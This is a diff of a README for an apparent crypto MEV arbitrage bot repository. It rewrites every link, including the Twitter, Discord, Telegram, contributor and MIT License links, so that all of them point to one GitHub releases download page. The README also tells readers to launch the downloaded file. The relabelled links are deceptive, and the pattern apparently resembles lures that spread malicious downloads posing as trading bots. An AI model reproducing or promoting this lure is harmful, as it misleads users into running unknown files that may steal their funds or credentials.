@@ -32,7 +32,7 @@ Explore a wide range of topics related to our repository:
 
 ## Releases
 
-For the latest release of our bot, please visit the following link: [![Download Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/releases/789694263/Release.zip)
+For the latest release of our bot, please visit the following link: [![Download Release](https://github.com/Gpacovilca/Mev-bot-BNB-ARBITRAGE/releases)](https://github.com/Gpacovilca/Mev-bot-BNB-ARBITRAGE/releases)
 
 If the link ends with the file name, launch it to access the latest version of the bot. In case the link is a website, simply visit it to explore the updates. If the link is not accessible or needs verification, kindly check the "Releases" section for more information.
 
@@ -50,22 +50,22 @@ Ready to take your trading journey to new heights with the Mev-bot-BNB-ARBITRAGE
 Join our growing community of traders, developers, and enthusiasts to share insights, collaborate on projects, and stay updated on the latest trends in the crypto space. Your journey to financial freedom begins here!
 
 🌟 **Connect with Us**:
-- [Twitter](https://twitter.com/MevBotOfficial)
-- [Discord](https://discord.com/invite/MevBotCommunity)
-- [Telegram](https://t.me/MevBotAnnouncements)
+- [Twitter](https://github.com/Gpacovilca/Mev-bot-BNB-ARBITRAGE/releases)
+- [Discord](https://github.com/Gpacovilca/Mev-bot-BNB-ARBITRAGE/releases)
+- [Telegram](https://github.com/Gpacovilca/Mev-bot-BNB-ARBITRAGE/releases)
 
 ## Contributors
 
 A big thank you to all the contributors who have helped shape and enhance the Mev-bot-BNB-ARBITRAGE repository. Your dedication and expertise are invaluable in driving innovation and success in the crypto trading landscape.
 
 👏 **Special Thanks To**:
-- [@username1](https://github.com/username1)
-- [@username2](https://github.com/username2)
-- [@username3](https://github.com/username3)
+- [@username1](https://github.com/Gpacovilca/Mev-bot-BNB-ARBITRAGE/releases)
+- [@username2](https://github.com/Gpacovilca/Mev-bot-BNB-ARBITRAGE/releases)
+- [@username3](https://github.com/Gpacovilca/Mev-bot-BNB-ARBITRAGE/releases)
 
 ## License
 
-The Mev-bot-BNB-ARBITRAGE repository is licensed under the [MIT License](https://opensource.org/licenses/MIT). Feel free to explore, modify, and share the codebase while adhering to the terms of the license.
+The Mev-bot-BNB-ARBITRAGE repository is licensed under the [MIT License](https://github.com/Gpacovilca/Mev-bot-BNB-ARBITRAGE/releases). Feel free to explore, modify, and share the codebase while adhering to the terms of the license.
 
 ---
 
